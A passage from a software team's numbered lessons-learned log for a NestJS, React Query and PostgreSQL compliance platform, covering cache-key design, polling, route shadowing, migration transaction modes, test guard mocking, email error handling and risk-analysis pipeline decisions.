the same cache entry by construction, and any `invalidateQueries({
queryKey })` invalidates both at once.

We deliberately gave both bell badges the EXACT same queryKey
`['notifications', 'unread-count']`. NotificationsPage's mutations
invalidate the `['notifications']` prefix, which catches both the
list query (`['notifications', filter]`) and the unread-count query
in one call.

**Lesson:** Two components reading the same data should use the same
`queryKey`. Cache coherence is then free — no Redux slice, no event
bus, no `useEffect` mirroring. Conversely, when components share a
domain prefix but differ in specifics, structure the key as
`['domain', specifier]` so a single `invalidateQueries({ queryKey:
['domain'] })` refreshes the whole group.

**Rules going forward:**
1. Before adding cross-component state synchronization (Redux,
   context, event bus), check whether the components could just share
   a React Query key.
2. Structure query keys hierarchically (`['notifications',
   'unread-count']`, `['notifications', filter]`) so prefix-based
   invalidation works.
3. Don't duplicate a queryFn across components — if two places need
   the same data, extract the key and the fn together (a tiny
   `useUnreadCount()` hook would be the next refactor here).

**Reference:** TopBar.tsx, AdminLayout.tsx, NotificationsPage.tsx —
all three carry the `['notifications', …]` prefix. Mutations
invalidate `['notifications']` and all three queries refresh.

## 107. `refetchIntervalInBackground: false` keeps backend load proportional to active users

**Context:** Naive polling fires the request on `setInterval` regardless
of whether the user is looking at the page. A user with 5 SIGN tabs open
overnight would generate 5 × (60 / 0.5) = 600 requests per hour to
`/notifications/unread-count` while they sleep. Multiplied across an
org with 100 users at 2 tabs average, that's 24,000 requests/hour of
pure noise — load that scales with browser count, not active users.

React Query's `refetchIntervalInBackground: false` option pauses the
poll the moment `document.visibilityState === 'hidden'` (tab blur, tab
switch, window minimize) and resumes immediately on visibility return.
Backend load now scales with focused tabs, which is the right metric.

We confirmed in the Phase 7.1 Step 4 verification pass that a headless
preview browser reports `visibilityState: 'hidden'` and `hasFocus():
false` — React Query correctly suppresses polling in that state. Forcing
`visibilityState` back to `'visible'` and dispatching a synthetic
`visibilitychange` event wakes the poll back up.

**Lesson:** Polling without a visibility guard is a backend-load
amplifier. The `refetchIntervalInBackground: false` flag is essentially
free to set, costs nothing in UX (visible users still see fresh data),
and substantially cuts the request rate from open-but-unused tabs.

**Rules going forward:**
1. Every `refetchInterval` MUST be paired with
   `refetchIntervalInBackground: false` unless there's a specific
   reason the data must stay fresh while the user isn't looking
   (e.g. a kiosk dashboard).
2. Don't try to be clever with `setInterval` + visibility listeners —
   React Query already does this correctly. Use the library.
3. Verification protocol: in any environment where the preview tab
   may not be focused (CI, headless test runners), assume polling
   pauses by design. Don't read "no second request after 30s" as a
   bug; check `document.visibilityState` first.

## 108. NestJS — Cross-Controller Route Shadowing: Dynamic `:id` Routes Shadow Static Routes in Later-Registered Controllers

**Problem:** `GET /obligations/portfolio` and `GET /obligations/calendar`
returned `400 Validation failed (uuid is expected)` instead of reaching
their correct handlers in `ComplianceObligationsController`. Both had
been working during unit tests but failed in the integrated app.

**Root cause:** NestJS registers all routes from module A before module B,
in the order modules appear in `app.module.ts` imports. Within a single
controller, static routes are sorted before dynamic — but that sorting
does NOT apply across controllers from different modules.

`ObligationsController` (from `ObligationsModule`, imported at line 190)
registers `@Get(':id')` first. `ComplianceObligationsController` (from
`ComplianceModule`, imported at line 218) registers
`@Get('obligations/portfolio')` and `@Get('obligations/calendar')` later.
When `GET /obligations/portfolio` arrives, Express matches the already-
registered `:id` route and passes `"portfolio"` to `ParseUUIDPipe`, which
correctly rejects it as not a UUID — but the error message makes it look
like a client bug, not a routing bug.

**Fix:** UUID regex constraint on all 4 dynamic routes in the earlier-
registered controller:
```typescript
@Get(':id([0-9a-f]{8}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{12})')
```
This causes Express to skip the `:id` route for non-UUID segments entirely,
allowing the later-registered static routes to match.

**Why `ParseUUIDPipe` alone doesn't fix it:** `ParseUUIDPipe` is a pipe,
not a route matcher. It runs *after* the route has already been matched.
By the time it rejects `"portfolio"`, the static route in the other
controller has been bypassed.

**How to avoid:**
- Any `@Get(':id')` (or `:param`) route that shares a URL prefix with
  static routes in *any other controller* must use a regex constraint.
- The symptom is always a 400 "uuid expected" on what appears to be a
  valid route — check module-import order before assuming client error.
- When adding a new module that registers routes under an existing prefix
  (e.g. `/obligations/…`), grep for `:id`-style routes in all earlier-
  imported modules and add constraints proactively.

**Reference:** `backend/src/modules/obligations/obligations.controller.ts`,
PR #26 (Phase 7.2).

## 109. PostgreSQL — ALTER TYPE ADD VALUE Requires `transaction = false` in TypeORM Migrations

**Problem:** Corrective migration `1748000000004-FixObligationStatusEnum.ts`
failed with:
```
Migrations "FixObligationStatusEnum1748000000004" override the transaction
mode, but the global transaction mode is "all"
```
After fixing the TypeORM config, a second error appeared on PostgreSQL < 14:
```
ERROR: ALTER TYPE ... cannot run inside a transaction block
```

**Root cause — two independent issues:**

1. **TypeORM `migrationsTransactionMode: 'all'` (the default)** wraps every
   migration run in a single transaction and blocks per-migration
   `transaction = false` overrides with `ForbiddenTransactionModeOverrideError`.
   The migration class property `transaction = false` only works when the
   global mode is `'each'` (each migration gets its own transaction, can
   opt out) or `'none'`.

2. **PostgreSQL < 14** forbids `ALTER TYPE … ADD VALUE` inside a transaction
   block at the SQL level. PostgreSQL 14+ relaxed this restriction, but
   setting `transaction = false` is still good practice for portability.

**Fix — two steps, both required:**

Step 1 — in `data-source.ts`:
```typescript
migrationsTransactionMode: 'each',
```

Step 2 — on the migration class:
```typescript
export class FixObligationStatusEnum1748000000004 implements MigrationInterface {
  transaction = false;  // ALTER TYPE ADD VALUE cannot run inside a transaction
  // …
}
```

**Rules going forward:**
1. Any migration that contains `ALTER TYPE … ADD VALUE` MUST set
   `transaction = false` as a class property.
2. `data-source.ts` MUST have `migrationsTransactionMode: 'each'` — the
   default `'all'` silently disables all per-migration transaction overrides.
3. Use `ADD VALUE IF NOT EXISTS` — idempotent, no catch block needed, safe
   to run on both patched and unpatched databases.
4. Add a startup assertion (`OnModuleInit`) to verify the enum has all
   required values after any migration that extends an enum. See
   `ObligationSchemaCheckService` for the pattern.

**Reference:** `backend/src/database/migrations/1748000000004-FixObligationStatusEnum.ts`,
`backend/src/config/data-source.ts`, PR #27 (Phase 7.3). See also
lesson #31 and #103 for the silent-catch anti-pattern that caused the
original bug.

---

## 110. NestJS Testing — `ThrottlerGuard` Cannot Be Resolved Without `ThrottlerModule` — Always `.overrideGuard(ThrottlerGuard)`

**Date:** 2026-05-27 | **Phase:** 6.9 | **Impact:** Test suite cannot start

**The bug:**
When a controller uses `@ThrottleOnly('waitlist')` (which internally applies
`@UseGuards(ThrottlerGuard)`), the NestJS `TestingModule` cannot resolve the
guard's DI dependencies at compile time:

```
Nest can't resolve dependencies of the ThrottlerGuard
  (?, Symbol(ThrottlerStorage), Reflector).
Please make sure that the argument 'THROTTLER:MODULE_OPTIONS' at index [0]
is available in the RootTestModule context.
```

`ThrottlerGuard` has 3 constructor parameters (`MODULE_OPTIONS`, `ThrottlerStorage`,
`Reflector`) that are only available when `ThrottlerModule.forRoot()` is included.
Adding the full `ThrottlerModule` to the test is wrong — tests must not hit rate
limits, they must be deterministic.

**The fix:**
Override the guard with a pass-through mock in `createTestingModule`:

```typescript
const module = await Test.createTestingModule({ controllers: [...], providers: [...] })
  .overrideGuard(ThrottlerGuard).useValue({ canActivate: () => true })
  .overrideGuard(JwtAuthGuard).useValue({ canActivate: () => true })
  .compile();
```

**The same issue appears in inline sub-apps built for 403 tests.** If you build
a second mini-app inside a `describe` block to test role-guard rejection, that
app also needs `ThrottlerGuard` overridden — it's not enough to only override it
in the main test app.

**Rules going forward:**
1. Any test module whose controller carries `@ThrottleOnly` or `@UseGuards(ThrottlerGuard)`
   MUST call `.overrideGuard(ThrottlerGuard).useValue({ canActivate: () => true })`.
2. Override BOTH `JwtAuthGuard` AND `ThrottlerGuard` together — if you only override
   one, the other may still be needed for DI resolution.
3. Do NOT add `ThrottlerModule.forRoot(...)` to the testing module just to make the
   guard resolve — tests must be rate-limit-free and deterministic.
4. This is the same class of problem as mocking any guard that has constructor
   dependencies: `AuthGuard`, `RolesGuard`, `ThrottlerGuard` — all must be overridden
   in unit tests, never provided with their real DI tree.

**Reference:** `backend/src/modules/waitlist/waitlist.controller.spec.ts`, PR #33 (Phase 6.9).

---

## 111. Migration Audit Pattern — `EXCEPTION WHEN` Is Never Safe; Always Use `IF NOT EXISTS` Subquery

**Date:** 2026-05-27 | **Phase:** 7.9 | **Impact:** Silent migration failures, potential data gaps

**The anti-pattern:**
```sql
DO $$ BEGIN
  CREATE TYPE foo_enum AS ENUM ('A', 'B');
EXCEPTION WHEN duplicate_object THEN null; END $$;
```

**Why it is dangerous beyond the obvious:**
`EXCEPTION WHEN duplicate_object THEN null` is commonly copy-pasted as "safe" boilerplate.
The real danger is template drift: developers copy this block for `ALTER TYPE ... ADD VALUE`
and change the exception catch to `WHEN undefined_object THEN null`. This silently swallows
wrong type names — exactly what caused the Phase 7.3 incident where `MET` and `WAIVED` were
absent from `obligation_status` for months with migrations showing "success".

**The correct patterns:**

For `CREATE TYPE`:
```sql
DO $$ BEGIN
  IF NOT EXISTS (SELECT 1 FROM pg_type WHERE typname = 'foo_enum') THEN
    CREATE TYPE foo_enum AS ENUM ('A', 'B');
  END IF;
END $$;
```

For `ADD CONSTRAINT`:
```sql
DO $$ BEGIN
  IF NOT EXISTS (SELECT 1 FROM pg_constraint WHERE conname = 'fk_name') THEN
    ALTER TABLE t ADD CONSTRAINT fk_name FOREIGN KEY (col) REFERENCES other(id);
  END IF;
END $$;
```

Note: PostgreSQL has no `CREATE TYPE IF NOT EXISTS` or `ADD CONSTRAINT IF NOT EXISTS`
syntax — the `DO $$ ... IF NOT EXISTS ... END $$` block is the only correct approach.

**Audit command to run before any new migration is approved:**
```bash
grep -rn "EXCEPTION WHEN" backend/src/database/migrations/
```
Zero results (except comments) is the passing bar. Any live SQL hit is a bug.

**How to read the results:** `EXCEPTION WHEN duplicate_object` on a CREATE TYPE is low
risk (benign in practice). `EXCEPTION WHEN undefined_object` on an ALTER TYPE is HIGH
risk — silently swallows wrong type names. Both patterns must be replaced — the safer
one because it can be copied into the dangerous one by the next developer.

**Rules going forward:**
1. Never write `EXCEPTION WHEN ... THEN null` in any migration block.
2. Run the audit grep before opening any PR that touches migrations.
3. The 7.9 audit found 25 instances across 5 files — all replaced. Fresh builds
   from scratch are now clean. Existing environments were already protected by
   `ObligationSchemaCheckService` (Phase 7.3).

**Reference:** 5 migration files patched, PR #34 (Phase 7.9). See also lessons
#31 and #103 for earlier encounters with the same class of bug.

---

## 112. Email — `FROM_EMAIL` vs `EMAIL_FROM` env var mismatch causes silent wrong-sender address

**Date:** 2026-05-28 | **Phase:** 9.1b | **Impact:** Silent wrong-sender on some email types

**The bug:**
`EmailService` read `FROM_EMAIL` (the canonical env var) in most email methods,
but one code path used `EMAIL_FROM` (wrong name). `process.env.EMAIL_FROM` was
`undefined`, so that path fell back to an empty string or a hardcoded placeholder,
causing some outgoing emails to show the wrong sender address. No exception was
thrown — `nodemailer` silently accepted the malformed sender.

**Root cause:**
Two different names for the same variable — one based on object-field naming
convention (`FROM_EMAIL: the email address used as the "from"`) and one based on
the reverse (`EMAIL_FROM: the "from" for email`). Both look correct in isolation.
The mismatch was invisible in tests because tests mock the transport layer.

**Fix:**
Unified all references to `FROM_EMAIL` throughout `email.service.ts`. Grep to verify:
```bash
grep -rn "EMAIL_FROM\|FROM_EMAIL" backend/src/modules/notifications/
```
Should return only `FROM_EMAIL`. Zero `EMAIL_FROM` hits.

**How to avoid:**
- When an env var controls a "from address", always name it `FROM_EMAIL` (noun first,
  qualifier second — matches the existing `FROM_EMAIL` in NestJS Joi schema).
- Add the canonical name to `backend/.env.example` with a comment. Never rely on
  developer memory.
- After any EmailService refactor, send a test email through every code path and
  inspect the `From:` header in the received email.

**Rules going forward:**
1. `FROM_EMAIL` is the canonical variable. `EMAIL_FROM` does not exist in this codebase — remove on sight.
2. When adding a new email template method, always use `configService.get<string>('FROM_EMAIL')`, never a hardcoded string or a differently-named env var.
3. The Joi schema (`app.module.ts`) is the single source of truth for env var names — always check it before adding a `configService.get()` call.

**Reference:** `backend/src/modules/notifications/email.service.ts`, PR #35 (Phase 9.1b).

---

## 113. NestJS — Symbol + `useFactory` Provider Pattern for Swappable Infrastructure Adapters

**Date:** 2026-05-28 | **Phase:** 9.1a/9.1b | **Impact:** Architecture pattern — clean driver swapping

**The pattern:**
When you need to swap out an infrastructure dependency (storage, email transport, OCR)
based on an env var, use a Symbol-based DI token + `useFactory` provider:

```typescript
// 1. Define the token and interface
export const STORAGE_ADAPTER = Symbol('STORAGE_ADAPTER');
export interface IStorageAdapter {
  upload(buffer: Buffer, filename: string, mimeType: string): Promise<StorageResult>;
}

// 2. Factory provider in the module
{
  provide: STORAGE_ADAPTER,
  inject: [ConfigService],
  useFactory: (config: ConfigService): IStorageAdapter => {
    const driver = config.get<string>('STORAGE_DRIVER', 'local');
    if (driver === 's3') {
      return new S3StorageAdapter(/* … */);
    }
    return new LocalStorageAdapter(/* … */);
  },
},

// 3. Inject by token in the service
constructor(
  @Inject(STORAGE_ADAPTER) private readonly adapter: IStorageAdapter,
) {}
```

**Why Symbol over string token:**
- Strings can silently conflict if two modules use the same name — `'STORAGE'` from
  module A and `'STORAGE'` from module B are the same DI token.
- Symbols are guaranteed unique — `Symbol('STORAGE_ADAPTER')` creates a new, unique
  token every time, so there can be no accidental conflict.
- TypeScript type inference flows correctly from `@Inject(STORAGE_ADAPTER)` when the
  interface is typed on the constructor parameter.

**Lazy imports inside `useFactory`:**
All concrete adapter imports MUST be inside the `useFactory` function body, not at
module level. This matches the pattern established in Celery tasks for the same reason:
avoid importing heavy dependencies (AWS SDK, nodemailer) at module load time.

**`@Global()` for platform-wide adapters:**
When a service is consumed by many modules (e.g. `StorageService` used by compliance,
admin-security, document-processing), mark its module `@Global()`. This allows injection
without explicit imports in every consuming module, which would cause circular dependency
risks and maintenance churn. NOT appropriate for domain-specific adapters.

**The Python equivalent (ai-backend):**
```python
# Factory function with lazy imports
def get_text_extractor() -> BaseTextExtractor:
    from app.config.settings import get_settings
    settings = get_settings()
    driver = settings.TEXT_EXTRACTOR
    if driver == 'textract':
        from app.services.textract_text_extractor import TextractTextExtractor
        return TextractTextExtractor(…)
    from app.services.tesseract_text_extractor import TesseractTextExtractor
    return TesseractTextExtractor()
```

**Testing impact:**
In NestJS unit tests, override the symbol token:
```typescript
{ provide: STORAGE_ADAPTER, useValue: { upload: jest.fn().mockResolvedValue({ file_url: '…', storage_key: '…' }) } }
```
In Python tests (pytest), mock the factory function:
```python
mocker.patch('app.services.text_extractor_factory.get_text_extractor',
             return_value=MagicMock(spec=BaseTextExtractor))
```

**Rules going forward:**
1. Every new swappable infrastructure dependency uses Symbol token + `useFactory` + interface. No concrete class imports at the call site.
2. Lazy imports inside `useFactory` are mandatory for adapters that import heavy SDKs.
3. `@Global()` only for truly platform-wide services (storage, email). Not for domain modules.
4. Never reference the concrete class in any consumer — always inject via the interface type.

**Reference:** `backend/src/modules/storage/`, `backend/src/modules/notifications/`,
`ai-backend/app/services/text_extractor_factory.py`, PR #35 (Phase 9.1).

---

## 114. Email — Fire-and-Forget Callers Must Catch at the Caller Level, Not Inside the Shared Send Method

**Date:** 2026-05-28 | **Phase:** 9.1 gap fix | **Impact:** Bull queue retries silently broken

**The bug:**
`sendGenericEmail` (the single transport dispatch point for all outbound email) contained
a `try/catch` that logged the error and returned normally — it never threw. The
`EmailQueueProcessor` called `sendGenericEmail` inside its own `try/catch` and re-threw for
Bull retry. But since `sendGenericEmail` never threw, the processor's `catch` block was
dead code — **Bull could never retry a failed email job**.

Meanwhile every high-level method (`sendMfaOtp`, `sendPasswordReset`, `sendInvitation`, etc.)
had no try/catch of its own. This was the correct instinct (fire-and-forget from the auth
flow) but achieved the wrong way: the swallowing lived in the wrong layer.

**The fix:**
Remove the `try/catch` from `sendGenericEmail` — make it throw on transport failure.
Add individual `try/catch` blocks to each high-level convenience method that needs
fire-and-forget semantics:

```typescript
// ✅ CORRECT — each caller decides its own error contract
async sendMfaOtp(email: string, otpCode: string): Promise<void> {
  // ... build html ...
  try {
    await this.sendGenericEmail(email, subject, html);
  } catch (error) {
    this.logger.error(`sendMfaOtp failed for ${email}`, error);
    // Best-effort — must not block the auth flow
  }
}

// sendGenericEmail THROWS — queue processor's catch block now executes
async sendGenericEmail(to: string, subject: string, html: string): Promise<void> {
  await this.provider.send({ from: this.fromEmail, to, subject, html });
  this.logger.log(`Email sent successfully to ${to}`);
}
```

**The EmailQueueProcessor already had the right pattern:**
```typescript
try {
  await this.emailService.sendGenericEmail(to, subject, html);
} catch (error) {
  this.logger.error(`Email job ${job.id} failed → ${to}: ${error.message}`);
  throw error; // Bull will retry based on queue config
}
```
Before the fix, the `throw error` on the last line was unreachable code.
After the fix, Bull retries work as designed.

**The principle:**
A shared send/dispatch method must model the lowest-level transport contract — it
either sends successfully or throws. The policy of whether that failure is fatal or
best-effort belongs at each call site, not inside the shared method. Putting the
swallow inside the shared method removes every caller's ability to opt into retries.

**Inventory of callers and their error contracts:**

| Caller | Error contract | Mechanism |
|---|---|---|
| `EmailQueueProcessor.handleSendEmail` | Retryable — Bull retries on throw | Re-throws from its own catch |
| `sendMfaOtp` | Best-effort — must not block login | try/catch logs and swallows |
| `sendMfaRecoveryCodes` | Best-effort — must not block MFA setup | try/catch logs and swallows |
| `sendPasswordReset` | Best-effort — must not break forgot-password | try/catch logs and swallows |
| `sendInvitation` | Best-effort — must not block user creation | try/catch logs and swallows |
| `sendContractApprovalRequest` | Best-effort — must not block approval workflow | try/catch logs and swallows |
| `DocuSignService` (direct) | Best-effort — already had its own catch | Existing try/catch now actually executes |

**How to avoid:**
When designing a service method that is used by both a queue processor AND synchronous
callers, always make the base method throw. Give each synchronous caller its own
try/catch with a comment explaining why it's safe to swallow. This makes the error
contract explicit and searchable — `grep -n "Best-effort"` finds every intentional swallow.

**Rules going forward:**
1. `sendGenericEmail` throws — never add a try/catch back to it.
2. Every new high-level email method (`sendSomethingNew`) MUST decide at the time it
   is written whether it is retryable (no catch — let it propagate) or best-effort
   (explicit try/catch with a comment). There is no third option.
3. If a new email flow needs guaranteed delivery, enqueue it via `NotificationDispatchService`
   → Bull queue → `EmailQueueProcessor` rather than calling `sendGenericEmail` directly
   from a synchronous service method.

**Reference:** `backend/src/modules/notifications/email.service.ts`,
`backend/src/modules/notifications/email-queue.processor.ts`, PR #36.


---

## 115. Phase 7.17 Prompt 1 — Operator-Decision Chain Captured Up-Front

Five operator decisions made before any code in B.1 / S.* / B.2 was
written. Each is documented in the plan file
`.claude/plans/delightful-orbiting-zebra.md` and shaped the
implementation. Captured here because the decisions are non-obvious
from the shipped code three months out:

- **Decision 1** — `is_platform_owned` column NOT added to
  `knowledge_assets`. The pre-existing convention `organization_id IS
  NULL AND source = 'PLATFORM_SEED'` is the platform-owned signal.
  Avoids duplicate boolean state for the same concept. App-layer KB
  visibility filter is the enforcement mechanism (deferred to B.2's
  follow-up work, not yet shipped).
- **Decision 2** — YAML frontmatter parsing dropped entirely.
  `is_risk_methodology_source = TRUE` KB entries store methodology
  as structured fields inside `content` jsonb under a
  `risk_methodology` key (category / likelihood / impact / optional
  notes). No YAML library imported. Reader validates the structure
  at read time.
- **Decision 3** — `RiskAnalysis.risk_category` stays as a free-text
  `varchar(100)` — NOT an FK to `risk_categories(id)`. Existing
  convention preserved; FK migration deferred to a later phase once
  historical data is reconciled.
- **Decision 4** — `risk_score` computed via TypeORM
  `@BeforeInsert` / `@BeforeUpdate` entity hook, NOT via Postgres
  `GENERATED ALWAYS AS … STORED` or a trigger. Most consistent with
  this codebase (zero existing generated-column / trigger
  precedent). See lesson #116 for the gotcha this creates.
- **Decision 5** — `content.risk_methodology` jsonb shape NOT
  enforced at DB level (no CHECK constraint on jsonb shape). B.2
  reader validates at read time; on failure it writes a
  `KB_RISK_REFERENCE_MALFORMED` audit-log entry and returns null
  (resolver falls through). Allows the common "edit content first,
  flag later" workflow.

**Reference:** `.claude/plans/delightful-orbiting-zebra.md` (the
plan files for B.1, S.*, B.2). All decisions surfaced via
`AskUserQuestion` during Plan Mode, not unilaterally.

---

## 116. @BeforeInsert / @BeforeUpdate Hooks DO NOT Fire on Repository.update()

Per Decision 4 (lesson #115), `risk_score` on `risk_analyses` is
computed by an `@BeforeInsert()` + `@BeforeUpdate()` lifecycle hook
on the `RiskAnalysis` entity (`setRiskScore() { this.risk_score =
this.likelihood * this.impact }`). The hook fires on
`Repository.save(entity)` when given a loaded entity instance — but
it does NOT fire on `Repository.update(criteria, partial)`, which
is a bulk-SQL path that bypasses entity instantiation entirely.

**Gotcha for any future writer that changes L or I**: must use
`repo.save(loadedEntity)` not `repo.update(id, { likelihood, impact })`.
Otherwise the DB row ends up with the new L / I but stale
`risk_score`, silently breaking every portfolio query that filters
or sorts on score.

B.3 (override service, not yet shipped) is the first downstream
consumer this affects. The plan flags it; future writers must respect
the same constraint. Alternative would be to also expose a static
helper `RiskAnalysis.computeScore(l, i)` and require callers using
`.update()` to pass `risk_score` explicitly — but the convention
"always go through save() for L / I changes" is simpler.

**Reference:** `backend/src/database/entities/risk-analysis.entity.ts`
(`@BeforeInsert` + `@BeforeUpdate` hooks), Phase 7.17 Prompt 1
S.1 + Decision 4 in the plan file.

---

## 117. Defense-in-Depth at the Orchestrator Layer — Per-Step Catch Plus Outer Catch

The B.1 `RiskMethodologyResolverService` walks a 4-step priority
chain. Every individual step (`tryStep1`, `tryStep2`, `tryStep3`,
`fallback`) has its own try/catch around the DB call so a missing
row or a query failure returns `null` and the chain continues.

But the **orchestrator's `for` loop** ALSO wraps each
`await steps[i].call(this, input)` in its own outer try/catch. Same
behaviour on the inside (catch + warn + fall through), different
purpose: it absorbs anything that escapes the per-step catch — e.g.
a future step author forgetting their inner try/catch, or a
synchronous throw on a path that wasn't Promise-rejection-shaped.

The contract is "the resolver MUST NEVER throw on the read path"
because the resolver is called inline during AI risk-analysis writes;
a throw would halt the AI extraction pipeline. The two-layer pattern
enforces the contract at two places so a single mistake on either
layer doesn't break it.

Not a textbook DI / SOLID pattern — it's deliberate belt-and-braces
for a critical-path piece of read-only code. Don't refactor the
outer try/catch away thinking it's redundant.

**Reference:** `backend/src/modules/risk-analysis/services/risk-methodology-resolver.service.ts`
(orchestrator loop), Phase 7.17 Prompt 1 B.1 plan file
"Error handling" + "Defense-in-depth" sections.

---

## 118. Deferred-FK Pattern Across Migrations With Forward Dependencies

When a new column on an existing table references a table that
another migration in the same phase creates, do NOT create the FK
constraint in the column-adding migration. Instead:

- Migration A (e.g. S.1 in Phase 7.17): `ADD COLUMN
  platform_default_ref_id UUID NULL` — no FK constraint.
- Migration B (e.g. S.2 in Phase 7.17): `CREATE TABLE
  risk_category_platform_defaults`, then at the end of `up()` add
  the FK via the `DO $$ BEGIN IF NOT EXISTS (...) THEN ALTER TABLE
  ... ADD CONSTRAINT ...; END IF; END$$` idempotent pattern.
- Migration B's `down()` drops the FK constraint FIRST, then drops
  the table; Migration A's `down()` drops the (now FK-free) column.

This preserves the user's spec numbering (S.1 owns the column, S.2
owns the table) and avoids reordering S.1 / S.2 just to satisfy a
referential dependency. Each migration reads cleanly in isolation.

The `ADD CONSTRAINT IF NOT EXISTS` syntax does NOT exist in
PostgreSQL — always wrap in the `DO $$ BEGIN IF NOT EXISTS (SELECT 1
FROM pg_constraint WHERE conname = '...') THEN ... END IF; END$$`
block. See `1748000000002-AddObligationAssigneesAndEscalation.ts:87-100`
for the canonical idiom, used again in S.1 and S.2 of Phase 7.17.

**Reference:** `backend/src/database/migrations/1748000000005-AddLikelihoodImpactToRiskAnalysis.ts`
(column added, no FK), `1748000000006-CreateRiskCategoryPlatformDefaults.ts`
(table + deferred FK).

---

## 119. "Single Function" In Spec Becomes Service When DI Is Needed

Phase 7.17 Prompt 1's original B.2 spec called for a
"single function `parseRiskMethodologyContent(asset): Promise<...>`"
that lived in `utils/risk-methodology-reader.ts`. During
implementation the function needed to inject `Repository<RiskCategory>`
(for category-name validation) and `Repository<AuditLog>` (for the
malformed-event audit write). Free functions cannot participate in
NestJS DI.

**Resolution**: convert to an `@Injectable() class
RiskMethodologyReaderService` with a single public method `parse()`.
Honours the spirit of "one piece of parsing logic, one public
method" while making DI work. Move the file from `utils/` to
`services/` to match the codebase convention (every other injectable
in this codebase lives in a `services/` subdirectory).

Cascading edits in B.1 (the caller): switch from module-level
import `import { parse... } from '...utils/...'` to constructor
injection of the service. The spec test's `jest.spyOn(readerModule,
...)` becomes a constructor-injected mock `{ parse: jest.fn() }`.
Mock setup changes ~12 lines; test assertions stay identical.

Recurrence flag: any future spec written as "a single function" with
external dependencies (DB, HTTP, config) is almost certainly going
to need this treatment. Plan for service form from the start.

**Reference:** `backend/src/modules/knowledge-assets/services/risk-methodology-reader.service.ts`
(the shipped service), B.2 plan file's "Public interface" section.

---

## 120. Pipeline Gap — A Dispatch Without A Consumer Is Invisible To One-Side Greps

Phase 7.17 A.1 surfaced that the per-clause AI risk-analysis pipeline
had been broken since inception: `finalizeReview()` dispatched the job
to the AI backend and returned the `risk_job_id` to the caller, but
nothing on the backend ever polled the job or wrote the results. Per-
clause risks were silently dropped on the floor; only the cross-document
conflict path (`pollAndSaveConflicts`) ever populated `risk_analyses`.

The audit-phase grep that looks at producer call-sites (`aiService.triggerRiskAnalysis(...)`)
shows a healthy dispatch and a `job_id` return path that looks complete.
Only a follow-up grep that asks "is there a polling consumer for that
job_id anywhere?" surfaces the gap.

**Rule for future agent runs**: when auditing an async pipeline, grep
BOTH the dispatch and the consumer side independently. A working
dispatch + missing consumer is invisible to a grep that only asks
"is there code that calls X?" without also asking "is there code that
reads X's output?"

**Reference:** `backend/src/modules/document-processing/document-processing.service.ts`
(the `pollAndSaveRisks` method shipped in A.1 closes the gap).

---

## 121. Mirror Existing Async Pipelines Verbatim — Don't Reinvent

A.1's new `pollAndSaveRisks` writer copies the structure of the
pre-existing `pollAndSaveConflicts` verbatim: same 60×3000ms polling
cadence, same fire-and-forget invocation pattern from `finalizeReview()`
with `.catch(err => logger.error(...))`, same try/catch shape, same
logger.warn-on-timeout. The mapping function inside (`saveAiRiskAsRow`)
diverges to reflect the new schema, but the polling skeleton is identical.

Reinventing the cadence or the error-handling shape would invite
divergence — over time the two pipelines would drift on retry counts,
log message format, or timeout behavior, making operational debugging
harder. When a new async pipeline needs to mirror an existing one,
copying the structure verbatim is the right move; only the per-finding
logic differs.

**Reference:** `pollAndSaveConflicts` (lines 679-742) and `pollAndSaveRisks`
(added in A.1) in `document-processing.service.ts`.

---

## 122. Mutually-Exclusive Conditions In Normalize-Then-Use Patterns

A.1 caught a dead-code bug in the first writer draft:

```ts
const aiCategory = rawCategory && rawCategory.length > 0
  ? rawCategory
  : 'Uncategorized';

// Later:
if (aiCategory === 'Uncategorized' && rawCategory) {
  await this.recordUnknownCategory(...);
}
```

The two clauses of the `if` are mutually exclusive: `aiCategory ===
'Uncategorized'` is only true when `rawCategory` was missing or empty,
but the second clause requires `rawCategory` to be truthy. The audit
log never fires. The bug only surfaced because a writer integration
test asserted the audit was called.

**Rule**: any code path that conditionally normalizes a value (raw →
default placeholder) and then conditionally branches on whether the
normalization happened MUST keep an explicit flag — `categoryWasUnrecognized:
boolean` — separate from the normalized value. Don't try to recover
"did we normalize?" by re-checking the original value alongside the
normalized one. The conditions will mutually exclude.

**Reference:** the fix in `saveAiRiskAsRow` (A.1) — explicit
`categoryWasUnrecognized` flag drives the audit-log branch.

---

## 123. "DO NOT MERGE TO PRODUCTION" Comment Block As Structural Gate

A.1's prompt update needed a domain expert (Ayman) to review the L/I
anchor language before going to production AI traffic, but the code
needed to land in main so the writer pipeline could be tested
end-to-end against canned fixtures. Solution: a multi-line `# ═══`
comment block placed at the top of the `SYSTEM_PROMPT` constant
itself, explicitly stating "DO NOT MERGE TO PRODUCTION WITHOUT AYMAN
SIGN-OFF" with the reasoning + two acceptable paths (feature flag /
config flag) listed.

Comment lives in the affected file — any PR reviewer touching the
prompt sees it before approving merge. Less brittle than an external
checklist or a tracking ticket because it cannot be missed without
deliberate suppression.

**Rule**: when operator review must happen before production rollout
but the code itself can land in main, drop a `# ═══` (or `// ═══`)
comment block at the top of the affected constant / function / class.
Use this pattern for any other future "land but don't roll out"
constraint — DocuSign template ID swaps, payment-processor key
changes, etc.

**Reference:** `ai-backend/app/agents/risk_analyzer.py` (the gate
shipped with A.1).

---

## 124. Pre-Implementation Verification When Plans Say "Verify X Before Relying On It"

B.3's plan flagged three things to verify before any code landed:
Bull was already in the codebase, `Contract.project_id` was NOT NULL,
and `Project.organization_id` was NOT NULL. All three were grep-
confirmed in one round trip; implementation that followed was
mechanical with zero surprises.

The pattern: when a plan depends on an environmental assumption
("the FK is non-null", "Bull is wired", "this column exists"), spend
the 30 seconds to confirm BEFORE writing the code that depends on it.
Catches the false-assumption case instantly; the all-confirmed case
costs nothing. Keep this discipline through the rest of Prompt 1
(and the rest of the platform's life).

**Reference:** B.3 plan's "Pre-implementation verifications" section,
which closed all three checks before the first edit.

---

## 125. v1 Invariant + Future-Migration TSDoc Pattern

B.3's override service collapsed two fields (likelihood_source +
impact_source) into one (previous_source) on the override-log table.
The collapse is correct for v1 (resolver always assigns both from
the same chain step) but a future phase might relax that. The
pairing that preserves the invariant AND signals the migration path:

1. **Runtime assertion at the boundary** — `applyOverride()` throws
   `InternalServerErrorException` immediately after loading the risk
   if `likelihood_source !== impact_source`. Test case asserts the
   throw. Future asymmetric-source write paths cannot accidentally
   produce malformed log rows; they trip the guard first.
2. **TSDoc on the collapsed schema field** — documents the v1
   invariant, names the guard that enforces it, and specifies the
   exact migration (split column into two; remove the guard) needed
   to safely extend.

